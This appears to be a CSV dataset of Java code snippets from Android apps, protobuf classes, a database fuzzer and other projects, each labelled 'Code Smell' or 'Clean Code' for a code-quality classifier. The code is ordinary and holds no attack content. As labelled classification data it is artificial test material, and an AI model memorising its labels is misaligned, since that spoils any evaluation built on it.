text,label,text_label
"@SuppressLint(""NotifyDataSetChanged"") private void showColorList(boolean show){
  if (isColorListShown != show) {
    isColorListShown=show;
    if (toolsTransformAnimation != null) {
      toolsTransformAnimation.cancel();
    }
    toolsTransformAnimation=new SpringAnimation(new FloatValueHolder(show ? 0 : 1000f));
    toolsTransformAnimation.setSpring(new SpringForce().setFinalPosition(show ? 1000f : 0f).setStiffness(1250f).setDampingRatio(SpringForce.DAMPING_RATIO_NO_BOUNCY));
    boolean[] moveBottomLayout=new boolean[]{keyboardVisible || emojiViewVisible};
    float bottomLayoutTranslationY=bottomLayout.getTranslationY();
    View barView=getBarView();
    toolsTransformAnimation.addUpdateListener((animation,value,velocity) -> {
      toolsTransformProgress=value / 1000f;
      float scale=0.6f + 0.4f * (1f - toolsTransformProgress);
      barView.setScaleX(scale);
      barView.setScaleY(scale);
      barView.setTranslationY(AndroidUtilities.dp(16) * Math.min(toolsTransformProgress,0.25f) / 0.25f);
      barView.setAlpha(1f - Math.min(toolsTransformProgress,0.25f) / 0.25f);
      colorsListView.setProgress(toolsTransformProgress,show);
      doneButton.setProgress(toolsTransformProgress);
      cancelButton.setProgress(toolsTransformProgress);
      tabsLayout.setTranslationY(AndroidUtilities.dp(32) * toolsTransformProgress);
      if (adjustPanLayoutHelper.animationInProgress()) {
        moveBottomLayout[0]=false;
      }
      if (moveBottomLayout[0]) {
        float progress=show ? toolsTransformProgress : 1f - toolsTransformProgress;
        bottomLayout.setTranslationY(bottomLayoutTranslationY - AndroidUtilities.dp(40) * progress * (show ? 1 : -1));
      }
      bottomLayout.invalidate();
      if (barView == textOptionsView) {
        overlayLayout.invalidate();
      }
    }
);
    toolsTransformAnimation.addEndListener((animation,canceled,value,velocity) -> {
      if (animation == toolsTransformAnimation) {
        toolsTransformAnimation=null;
        if (!show) {
          colorsListView.setVisibility(GONE);
          PersistColorPalette.getInstance(currentAccount).saveColors();
          colorsListView.getAdapter().notifyDataSetChanged();
        }
      }
    }
);
    toolsTransformAnimation.start();
    if (show) {
      colorsListView.setVisibility(VISIBLE);
      colorsListView.setSelectedColorIndex(0);
    }
  }
}",1,Code Smell
"public static void main(String[] args) throws Exception {
  Arguments arguments=Arguments.fromArgs(args);
  int repetitions=arguments.getInteger(""bench_repetitions"",""number of repetitions"",10);
  int nrTileReads=arguments.getInteger(""bench_nr_tile_reads"",""number of tiles to read"",500_000);
  int preWarms=arguments.getInteger(""bench_pre_warms"",""number of pre warm runs"",3);
  List<Path> mbtilesPaths=arguments.getList(""bench_mbtiles"",""the mbtiles file to read from"",List.of()).stream().map(Paths::get).toList();
  if (mbtilesPaths.isEmpty()) {
    throw new IllegalArgumentException(""pass one or many paths to the same mbtiles file"");
  }
  mbtilesPaths.stream().forEach(p -> {
    if (!Files.exists(p) || !Files.isRegularFile(p)) {
      throw new IllegalArgumentException(""%s does not exists"".formatted(p));
    }
  }
);
  List<TileCoord> randomCoordsToFetchPerRepetition=new LinkedList<>();
  do {
    try (var db=Mbtiles.newReadOnlyDatabase(mbtilesPaths.getFirst())){
      try (var statement=db.connection().prepareStatement(SELECT_RANDOM_COORDS)){
        statement.setInt(1,nrTileReads - randomCoordsToFetchPerRepetition.size());
        var rs=statement.executeQuery();
        while (rs.next()) {
          int x=rs.getInt(""tile_column"");
          int y=rs.getInt(""tile_row"");
          int z=rs.getInt(""zoom_level"");
          randomCoordsToFetchPerRepetition.add(TileCoord.ofXYZ(x,(1 << z) - 1 - y,z));
        }
      }
     }
   }
 while (randomCoordsToFetchPerRepetition.size() < nrTileReads);
  Map<Path,Double> avgReadOperationsPerSecondPerDb=new HashMap<>();
  for (  Path dbPath : mbtilesPaths) {
    List<ReadResult> results=new LinkedList<>();
    LOGGER.info(""working on {}"",dbPath);
    for (int preWarm=0; preWarm < preWarms; preWarm++) {
      readEachTile(randomCoordsToFetchPerRepetition,dbPath);
    }
    for (int rep=0; rep < repetitions; rep++) {
      results.add(readEachTile(randomCoordsToFetchPerRepetition,dbPath));
    }
    var readOperationsPerSecondStats=results.stream().mapToDouble(ReadResult::readOperationsPerSecond).summaryStatistics();
    LOGGER.info(""readOperationsPerSecondStats: {}"",readOperationsPerSecondStats);
    avgReadOperationsPerSecondPerDb.put(dbPath,readOperationsPerSecondStats.getAverage());
  }
  List<Path> keysSorted=avgReadOperationsPerSecondPerDb.entrySet().stream().sorted((o1,o2) -> o1.getValue().compareTo(o2.getValue())).map(Map.Entry::getKey).toList();
  LOGGER.info(""diffs"");
  for (int i=0; i < keysSorted.size() - 1; i++) {
    for (int j=i + 1; j < keysSorted.size(); j++) {
      Path db0=keysSorted.get(i);
      double avg0=avgReadOperationsPerSecondPerDb.get(db0);
      Path db1=keysSorted.get(j);
      double avg1=avgReadOperationsPerSecondPerDb.get(db1);
      double diff=avg1 * 100 / avg0 - 100;
      LOGGER.info(""\""{}\"" to \""{}\"": avg read operations per second improved by {}%"",db0,db1,diff);
    }
  }
}",1,Code Smell
"@Override protected void drawPickerChart(Canvas canvas){
  int bottom=getMeasuredHeight() - PICKER_PADDING;
  int top=getMeasuredHeight() - pikerHeight - PICKER_PADDING;
  int nl=lines.size();
  if (chartData != null) {
    for (int k=0; k < nl; k++) {
      LineViewData line=lines.get(k);
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePath.reset();
      int n=chartData.xPercentage.length;
      int j=0;
      final long[] y=line.line.y;
      line.chartPath.reset();
      for (int i=0; i < n; i++) {
        if (y[i] < 0)         continue;
        float xPoint=chartData.xPercentage[i] * pickerWidth;
        float h=ANIMATE_PICKER_SIZES ? pickerMaxHeight : chartData.maxValue;
        float hMin=ANIMATE_PICKER_SIZES ? pickerMinHeight : chartData.minValue;
        float yPercentage=(y[i] - hMin) / (h - hMin);
        float yPoint=(1f - yPercentage) * pikerHeight;
        if (USE_LINES) {
          if (j == 0) {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
 else {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
        }
 else {
          if (i == 0) {
            line.bottomLinePath.moveTo(xPoint,yPoint);
          }
 else {
            line.bottomLinePath.lineTo(xPoint,yPoint);
          }
        }
      }
      line.linesPathBottomSize=j;
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePaint.setAlpha((int)(255 * line.alpha));
      if (USE_LINES)       canvas.drawLines(line.linesPathBottom,0,line.linesPathBottomSize,line.bottomLinePaint);
 else       canvas.drawPath(line.bottomLinePath,line.bottomLinePaint);
    }
  }
}",1,Code Smell
"/** 
 * Seeks to the specified position in microseconds.
 * @param positionUs The seek position in microseconds.
 */
public void seekToUs(long positionUs){
  lastSeekPositionUs=positionUs;
  if (isPendingReset()) {
    pendingResetPositionUs=positionUs;
    return;
  }
  BaseMediaChunk seekToMediaChunk=null;
  for (int i=0; i < mediaChunks.size(); i++) {
    BaseMediaChunk mediaChunk=mediaChunks.get(i);
    long mediaChunkStartTimeUs=mediaChunk.startTimeUs;
    if (mediaChunkStartTimeUs == positionUs && mediaChunk.clippedStartTimeUs == C.TIME_UNSET) {
      seekToMediaChunk=mediaChunk;
      break;
    }
 else     if (mediaChunkStartTimeUs > positionUs) {
      break;
    }
  }
  boolean seekInsideBuffer;
  primarySampleQueue.rewind();
  if (seekToMediaChunk != null) {
    seekInsideBuffer=primarySampleQueue.setReadPosition(seekToMediaChunk.getFirstSampleIndex(0));
    decodeOnlyUntilPositionUs=0;
  }
 else {
    seekInsideBuffer=primarySampleQueue.advanceTo(positionUs,true,positionUs < getNextLoadPositionUs()) != SampleQueue.ADVANCE_FAILED;
    decodeOnlyUntilPositionUs=lastSeekPositionUs;
  }
  if (seekInsideBuffer) {
    nextNotifyPrimaryFormatMediaChunkIndex=primarySampleIndexToMediaChunkIndex(primarySampleQueue.getReadIndex(),0);
    for (    SampleQueue embeddedSampleQueue : embeddedSampleQueues) {
      embeddedSampleQueue.rewind();
      embeddedSampleQueue.advanceTo(positionUs,true,false);
    }
  }
 else {
    pendingResetPositionUs=positionUs;
    loadingFinished=false;
    mediaChunks.clear();
    nextNotifyPrimaryFormatMediaChunkIndex=0;
    if (loader.isLoading()) {
      loader.cancelLoading();
    }
 else {
      loader.clearFatalError();
      primarySampleQueue.reset();
      for (      SampleQueue embeddedSampleQueue : embeddedSampleQueues) {
        embeddedSampleQueue.reset();
      }
    }
  }
}",1,Code Smell
"@Override public void onWebAppSwitchInlineQuery(TLRPC.User botUser,String query,List<String> chatTypes){
  if (chatTypes.isEmpty()) {
    if (parentActivity instanceof LaunchActivity) {
      BaseFragment lastFragment=((LaunchActivity)parentActivity).getActionBarLayout().getLastFragment();
      if (lastFragment instanceof ChatActivity) {
        ((ChatActivity)lastFragment).getChatActivityEnterView().setFieldText(""@"" + UserObject.getPublicUsername(botUser) + "" ""+ query);
        dismiss();
      }
    }
  }
 else {
    Bundle args=new Bundle();
    args.putInt(""dialogsType"",DialogsActivity.DIALOGS_TYPE_START_ATTACH_BOT);
    args.putBoolean(""onlySelect"",true);
    args.putBoolean(""allowGroups"",chatTypes.contains(""groups""));
    args.putBoolean(""allowUsers"",chatTypes.contains(""users""));
    args.putBoolean(""allowChannels"",chatTypes.contains(""channels""));
    args.putBoolean(""allowBots"",chatTypes.contains(""bots""));
    DialogsActivity dialogsActivity=new DialogsActivity(args);
    AndroidUtilities.hideKeyboard(frameLayout);
    OverlayActionBarLayoutDialog overlayActionBarLayoutDialog=new OverlayActionBarLayoutDialog(context,resourcesProvider);
    dialogsActivity.setDelegate((fragment,dids,message1,param,topicsFragment) -> {
      long did=dids.get(0).dialogId;
      Bundle args1=new Bundle();
      args1.putBoolean(""scrollToTopOnResume"",true);
      if (DialogObject.isEncryptedDialog(did)) {
        args1.putInt(""enc_id"",DialogObject.getEncryptedChatId(did));
      }
 else       if (DialogObject.isUserDialog(did)) {
        args1.putLong(""user_id"",did);
      }
 else {
        args1.putLong(""chat_id"",-did);
      }
      args1.putString(""inline_query_input"",""@"" + UserObject.getPublicUsername(botUser) + "" ""+ query);
      if (parentActivity instanceof LaunchActivity) {
        BaseFragment lastFragment=((LaunchActivity)parentActivity).getActionBarLayout().getLastFragment();
        if (MessagesController.getInstance(currentAccount).checkCanOpenChat(args1,lastFragment)) {
          overlayActionBarLayoutDialog.dismiss();
          dismissed=true;
          AndroidUtilities.cancelRunOnUIThread(pollRunnable);
          webViewContainer.destroyWebView();
          NotificationCenter.getInstance(currentAccount).removeObserver(BotWebViewSheet.this,NotificationCenter.webViewResultSent);
          NotificationCenter.getGlobalInstance().removeObserver(BotWebViewSheet.this,NotificationCenter.didSetNewTheme);
          BotWebViewSheet.super.dismiss();
          lastFragment.presentFragment(new INavigationLayout.NavigationParams(new ChatActivity(args1)).setRemoveLast(true));
        }
      }
      return true;
    }
);
    overlayActionBarLayoutDialog.show();
    overlayActionBarLayoutDialog.addFragment(dialogsActivity);
  }
}",1,Code Smell
"private static boolean move(int[][] mat,int row,int col,int player){
  mat[row][col]=player;
  boolean win=true;
  for (int i=0; i < mat[0].length; i++) {
    if (mat[row][i] != player) {
      win=false;
      break;
    }
  }
  if (win) {
    return true;
  }
  win=true;
  for (int i=0; i < mat.length; i++) {
    if (mat[i][col] != player) {
      win=false;
      break;
    }
  }
  if (win) {
    return true;
  }
  win=true;
  if (row == col) {
    for (int i=0; i < mat.length; i++) {
      if (mat[i][i] != player) {
        win=false;
        break;
      }
    }
  }
  if (win) {
    return true;
  }
  win=true;
  for (int i=mat.length - 1, j=0; i >= 0 && j < mat[0].length; i--, j++) {
    if (mat[i][j] != player) {
      win=false;
      break;
    }
  }
  if (win) {
    return true;
  }
  return false;
}",1,Code Smell
"public void showWithAction(long did,int action,Runnable actionRunnable){
  showWithAction(did,action,null,null,actionRunnable,null);
}
public void showWithAction(long did,int action,Object infoObject){
  showWithAction(did,action,infoObject,null,null,null);
}
public void showWithAction(long did,int action,Runnable actionRunnable,Runnable cancelRunnable){
  showWithAction(did,action,null,null,actionRunnable,cancelRunnable);
}
public void showWithAction(long did,int action,Object infoObject,Runnable actionRunnable,Runnable cancelRunnable){
  showWithAction(did,action,infoObject,null,actionRunnable,cancelRunnable);
}
public void showWithAction(long did,int action,Object infoObject,Object infoObject2,Runnable actionRunnable,Runnable cancelRunnable){
  ArrayList<Long> ids=new ArrayList<>();
  ids.add(did);
  showWithAction(ids,action,infoObject,infoObject2,actionRunnable,cancelRunnable);
}
public void showWithAction(ArrayList<Long> dialogIds,int action,Object infoObject,Object infoObject2,Runnable actionRunnable,Runnable cancelRunnable){
}",1,Code Smell
"@Override public void generateDatabase(TiDBGlobalState globalState) throws Exception {
  for (int i=0; i < Randomly.fromOptions(1,2); i++) {
    boolean success;
    do {
      SQLQueryAdapter qt=new TiDBTableGenerator().getQuery(globalState);
      success=globalState.executeStatement(qt);
    }
 while (!success);
  }
  StatementExecutor<TiDBGlobalState,Action> se=new StatementExecutor<>(globalState,Action.values(),TiDBProvider::mapActions,(q) -> {
    if (globalState.getSchema().getDatabaseTables().isEmpty()) {
      throw new IgnoreMeException();
    }
  }
);
  try {
    se.executeStatements();
  }
 catch (  SQLException e) {
    if (e.getMessage().contains(""references invalid table(s) or column(s) or function(s) or definer/invoker of view lack rights to use them"")) {
      throw new IgnoreMeException();
    }
 else {
      throw new AssertionError(e);
    }
  }
  if (globalState.getDbmsSpecificOptions().getTestOracleFactory().stream().anyMatch((o) -> o == TiDBOracleFactory.CERT)) {
    globalState.executeStatement(new SQLQueryAdapter(""SET @@sql_mode='STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION';""));
    ExpectedErrors errors=new ExpectedErrors();
    TiDBErrors.addExpressionErrors(errors);
    for (    TiDBTable table : globalState.getSchema().getDatabaseTables()) {
      if (!table.isView()) {
        globalState.executeStatement(new SQLQueryAdapter(""ANALYZE TABLE "" + table.getName() + "";"",errors));
      }
    }
  }
  if (globalState.getDbmsSpecificOptions().tiflash) {
    ExpectedErrors errors=new ExpectedErrors();
    TiDBErrors.addExpressionErrors(errors);
    for (    TiDBTable table : globalState.getSchema().getDatabaseTables()) {
      if (!table.isView()) {
        globalState.executeStatement(new SQLQueryAdapter(""ALTER TABLE "" + table.getName() + "" SET TIFLASH REPLICA 1;"",errors));
      }
    }
    if (Randomly.getBoolean()) {
      globalState.executeStatement(new SQLQueryAdapter(""set @@tidb_enforce_mpp=1;""));
    }
  }
}",1,Code Smell
"public static String parseCycleUnit(String scheduleTime){
  String cycleUnit=""D"";
  StringTokenizer st=new StringTokenizer(scheduleTime,"" "");
  if (st.countTokens() <= 0) {
    return ""D"";
  }
  int index=0;
  while (st.hasMoreElements()) {
    String currentString=st.nextToken();
    if (currentString.contains(""/"")) {
      if (index == 1) {
        cycleUnit=""10m"";
      }
 else       if (index == 2) {
        cycleUnit=""h"";
      }
      break;
    }
    if (currentString.equals(""*"")) {
      if (index == 3) {
        cycleUnit=""D"";
      }
      break;
    }
    index++;
  }
  logger.info(""ScheduleTime: "" + scheduleTime + "", cycleUnit: ""+ cycleUnit);
  return cycleUnit;
}",1,Code Smell
"public GProRetentionGuildListRsp(){
  this.recommendChannels=new ArrayList<>();
  this.cookies=new byte[0];
}
public GProRetentionGuildListRsp(ArrayList<GProRetentionChannelInfo> arrayList,int i2,byte[] bArr,boolean z){
  this.recommendChannels=new ArrayList<>();
  this.cookies=new byte[0];
  this.recommendChannels=arrayList;
  this.nextTs=i2;
  this.cookies=bArr;
  this.isEnd=z;
}",0,Clean Code
"public static RollRogueBuffScRsp parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new RollRogueBuffScRsp(),data).checkInitialized();
}
public static RollRogueBuffScRsp parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new RollRogueBuffScRsp(),input).checkInitialized();
}
public static RollRogueBuffScRsp parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new RollRogueBuffScRsp(),input).checkInitialized();
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.common.tree.protos.LeafNodeProto)) {
    return super.equals(obj);
  }
  org.tribuo.common.tree.protos.LeafNodeProto other=(org.tribuo.common.tree.protos.LeafNodeProto)obj;
  if (getParentIdx() != other.getParentIdx())   return false;
  if (getCurIdx() != other.getCurIdx())   return false;
  if (java.lang.Double.doubleToLongBits(getImpurity()) != java.lang.Double.doubleToLongBits(other.getImpurity()))   return false;
  if (hasOutput() != other.hasOutput())   return false;
  if (hasOutput()) {
    if (!getOutput().equals(other.getOutput()))     return false;
  }
  if (!internalGetScore().equals(other.internalGetScore()))   return false;
  if (getGeneratesProbabilities() != other.getGeneratesProbabilities())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"@Override public FarmStageGachaInfo clone(){
  return new FarmStageGachaInfo().copyFrom(this);
}
",0,Clean Code
"private boolean isCollapseMiuiTitleApps(){
  return mPrefsMap.getStringAsInt(""various_collapse_miui_title"",0) != 0 && collapseMiuiTitleApps.contains(mPackageName);
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(worldLevel);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(wave);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(cocoonId);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(propEntityId);
  }
  return size;
}",0,Clean Code
"public LocalStackContainer(DockerImageName dockerImageName){
  super(dockerImageName);
  withCreateContainerCmdModifier(cmd -> cmd.withEntrypoint(""sh""));
  setCommand(""-c"",""while [ ! -f "" + STARTER_SCRIPT + "" ]; do sleep 0.1; done; ""+ STARTER_SCRIPT);
  withEnv(""LOCALSTACK_HOST"",""localhost.localstack.cloud"");
  withEnv(""SERVICES"",""opensearch"");
}",0,Clean Code
"/** 
 * Start preloading the widget.
 */
private boolean preloadWidget(){
  final LauncherAppWidgetProviderInfo pInfo=mInfo.info;
  if (pInfo.isCustomWidget()) {
    return false;
  }
  final Bundle options=mInfo.getDefaultSizeOptions(mLauncher);
  if (mInfo.getHandler().needsConfigure()) {
    mInfo.bindOptions=options;
    return false;
  }
  mBindWidgetRunnable=new Runnable(){
    @Override public void run(){
      mWidgetLoadingId=mLauncher.getAppWidgetHolder().allocateAppWidgetId();
      if (LOGD) {
        Log.d(TAG,""Binding widget, id: "" + mWidgetLoadingId);
      }
      if (new WidgetManagerHelper(mLauncher).bindAppWidgetIdIfAllowed(mWidgetLoadingId,pInfo,options)) {
        mHandler.post(mInflateWidgetRunnable);
      }
    }
  }
;
  mInflateWidgetRunnable=new Runnable(){
    @Override public void run(){
      if (LOGD) {
        Log.d(TAG,""Inflating widget, id: "" + mWidgetLoadingId);
      }
      if (mWidgetLoadingId == -1) {
        return;
      }
      AppWidgetHostView hostView=mLauncher.getAppWidgetHolder().createView((Context)mLauncher,mWidgetLoadingId,pInfo);
      mInfo.boundWidget=hostView;
      mWidgetLoadingId=-1;
      hostView.setVisibility(View.INVISIBLE);
      int[] unScaledSize=mLauncher.getWorkspace().estimateItemSize(mInfo);
      DragLayer.LayoutParams lp=new DragLayer.LayoutParams(unScaledSize[0],unScaledSize[1]);
      lp.x=lp.y=0;
      lp.customPosition=true;
      hostView.setLayoutParams(lp);
      if (LOGD) {
        Log.d(TAG,""Adding host view to drag layer"");
      }
      mLauncher.getDragLayer().addView(hostView);
      mView.setTag(mInfo);
    }
  }
;
  if (LOGD) {
    Log.d(TAG,""About to bind/inflate widget"");
  }
  mHandler.post(mBindWidgetRunnable);
  return true;
}",0,Clean Code
"@Override public SingleCallGraphRootTreeNode getRootNode(){
  return (SingleCallGraphRootTreeNode)getAbstractRootNode();
}
",0,Clean Code
"@Override protected Boolean computeValue(Class<?> type){
  try {
    return (boolean)IS_RECORD.invoke(type);
  }
 catch (  IllegalAccessException|InvocationTargetException e) {
    throw new RuntimeException(e);
  }
}
@Override protected RecordComponent[] computeValue(Class<?> type){
  try {
    MethodHandles.Lookup lookup=_JDKAccess._trustedLookup(type);
    Object[] components=(Object[])GET_RECORD_COMPONENTS.invoke(type);
    RecordComponent[] recordComponents=new RecordComponent[components.length];
    for (int i=0; i < components.length; i++) {
      Object component=components[i];
      Method accessor=(Method)GET_ACCESSOR.invoke(component);
      Class<?> fieldType=(Class<?>)GET_TYPE.invoke(component);
      MethodHandle handle=lookup.unreflect(accessor);
      Object getter=_JDKAccess.makeGetterFunction(lookup,handle,fieldType);
      recordComponents[i]=new RecordComponent((Class<?>)GET_DECLARING_RECORD.invoke(component),(String)GET_NAME.invoke(component),fieldType,(Type)GET_GENERIC_TYPE.invoke(component),accessor,getter);
    }
    return recordComponents;
  }
 catch (  IllegalAccessException|InvocationTargetException e) {
    throw new RuntimeException(e);
  }
}
@Override protected Tuple2<Constructor,MethodHandle> computeValue(Class<?> type){
  RecordComponent[] components=RecordUtils.getRecordComponents(type);
  if (components == null) {
    return null;
  }
  Class<?>[] paramTypes=Arrays.stream(components).map(RecordComponent::getType).toArray(Class<?>[]::new);
  Constructor constructor;
  try {
    constructor=type.getDeclaredConstructor(paramTypes);
  }
 catch (  NoSuchMethodException e) {
    throw new RuntimeException(e);
  }
  MethodHandles.Lookup lookup=_JDKAccess._trustedLookup(type);
  if (lookup != null) {
    try {
      MethodHandle handle=lookup.findConstructor(type,MethodType.methodType(void.class,paramTypes));
      return Tuple2.of(constructor,handle);
    }
 catch (    NoSuchMethodException|IllegalAccessException e) {
      return Tuple2.of(constructor,null);
    }
  }
 else {
    return Tuple2.of(constructor,null);
  }
}",0,Clean Code
"public static SceneEntityInfo parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new SceneEntityInfo(),data).checkInitialized();
}
public static SceneEntityInfo parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new SceneEntityInfo(),input).checkInitialized();
}
public static SceneEntityInfo parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new SceneEntityInfo(),input).checkInitialized();
}
",0,Clean Code
"public String getBytesReserveInfo(){
  return this.bytesReserveInfo;
}
",0,Clean Code
"@Override public void removedNode(final ZyGraphNode<? extends IViewNode<?>> removedNode){
  for (int j=0; j < getChildCount(); ++j) {
    final SelectionHistoryTreeNode leaf=(SelectionHistoryTreeNode)getChildAt(j);
    if (leaf.getNode() == removedNode) {
      ((DefaultTreeModel)getTree().getModel()).removeNodeFromParent(leaf);
      leaf.removeFromParent();
      setUserObject(new SelectionHistoryTreeNodeWrapper(snapshot,snapshotCount));
      break;
    }
  }
}",0,Clean Code
"@Bean public TitanEmbeddingBedrockApi titanEmbeddingApi(){
  return new TitanEmbeddingBedrockApi(TitanEmbeddingModel.TITAN_EMBED_IMAGE_V1.id(),EnvironmentVariableCredentialsProvider.create(),Region.US_EAST_1.id(),new ObjectMapper(),Duration.ofMinutes(2));
}",0,Clean Code
"@Override public void writeTo(ProtoSink output) throws IOException {
  output.writeRawBytes(data);
}
",0,Clean Code
"void setSelected(boolean selected);
",0,Clean Code
"@Override public void init(){
  mPackageManagerService=findClassIfExists(""com.android.server.pm.PackageManagerService"");
  findAndHookMethod(mPackageManagerService,""systemReady"",new MethodHook(){
    @Override protected void after(    MethodHookParam param) throws Throwable {
      Context mContext=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
      Handler mHandler=(Handler)XposedHelpers.getObjectField(param.thisObject,""mHandler"");
      new PrefsChangeObserver(mContext,mHandler,""prefs_key_system_framework_clean_share_apps""){
        @Override public void onChange(        String name){
          mPrefsMap.put(name,PrefsUtils.getSharedStringSetPrefs(mContext,name));
        }
      }
;
    }
  }
);
  MethodHook hook=new MethodHook(){
    @Override @SuppressWarnings(""unchecked"") protected void after(    MethodHookParam param) throws Throwable {
      try {
        if (param.args[0] == null)         return;
        Intent origIntent=(Intent)param.args[0];
        String action=origIntent.getAction();
        if (action == null)         return;
        if (!action.equals(Intent.ACTION_SEND) && !action.equals(Intent.ACTION_SENDTO) && !action.equals(Intent.ACTION_SEND_MULTIPLE))         return;
        Intent intent=(Intent)origIntent.clone();
        if (intent.getDataString() != null && intent.getDataString().contains("":""))         return;
        if (intent.hasExtra(""HyperCeiler"") && intent.getBooleanExtra(""HyperCeiler"",false))         return;
        Set<String> selectedApps=mPrefsMap.getStringSet(""system_framework_clean_share_apps"");
        List<ResolveInfo> resolved=(List<ResolveInfo>)param.getResult();
        ResolveInfo resolveInfo;
        Context mContext=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
        PackageManager pm=mContext.getPackageManager();
        Iterator<ResolveInfo> itr=resolved.iterator();
        while (itr.hasNext()) {
          resolveInfo=itr.next();
          boolean removeOriginal=selectedApps.contains(resolveInfo.activityInfo.packageName) || selectedApps.contains(resolveInfo.activityInfo.packageName + ""|0"");
          boolean removeDual=selectedApps.contains(resolveInfo.activityInfo.packageName + ""|999"");
          boolean hasDual=false;
          try {
            hasDual=XposedHelpers.callMethod(pm,""getPackageInfoAsUser"",resolveInfo.activityInfo.packageName,0,999) != null;
          }
 catch (          Throwable ignore) {
          }
          if ((removeOriginal && !hasDual) || removeOriginal && hasDual && removeDual)           itr.remove();
        }
        param.setResult(resolved);
      }
 catch (      Throwable t) {
        if (!(t instanceof BadParcelableException))         logE(TAG,CleanShareMenu.this.lpparam.packageName,t);
      }
    }
  }
;
  String ActQueryService=isMoreAndroidVersion(33) ? ""com.android.server.pm.ComputerEngine"" : ""com.android.server.pm.PackageManagerService$ComputerEngine"";
  hookAllMethods(ActQueryService,lpparam.classLoader,""queryIntentActivitiesInternal"",hook);
}",0,Clean Code
"public RedisMetadataDAO(JedisProxy jedisProxy,ObjectMapper objectMapper,ConductorProperties conductorProperties,RedisProperties properties){
  super(jedisProxy,objectMapper,conductorProperties,properties);
  refreshTaskDefs();
  long cacheRefreshTime=properties.getTaskDefCacheRefreshInterval().getSeconds();
  Executors.newSingleThreadScheduledExecutor().scheduleWithFixedDelay(this::refreshTaskDefs,cacheRefreshTime,cacheRefreshTime,TimeUnit.SECONDS);
}
",0,Clean Code
